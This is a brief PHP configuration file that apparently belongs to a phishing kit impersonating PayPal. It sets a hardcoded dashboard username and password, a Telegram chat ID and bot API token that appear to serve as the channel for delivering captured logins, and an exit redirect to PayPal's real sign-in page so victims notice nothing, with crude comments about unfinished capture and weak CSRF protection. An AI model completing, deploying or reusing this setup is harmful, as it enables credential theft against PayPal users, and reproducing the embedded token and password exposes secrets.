<?php
// dashboard password
$portal_password = "richerthanthou";
$portal_user = "glock";
// telegram
$chat_id = "-1001200030824";
$api_token = "1795958227:AAGFluLugLAuIKbyz7vWuawB3WHjX-rxsfc";
// exit
$exit = "https://www.paypal.com/us/signin";
// capture idk yet

// csrf validation THIS IS DOGSHIT NO GURANTEES U CANT BE BRUTED LMAO

?>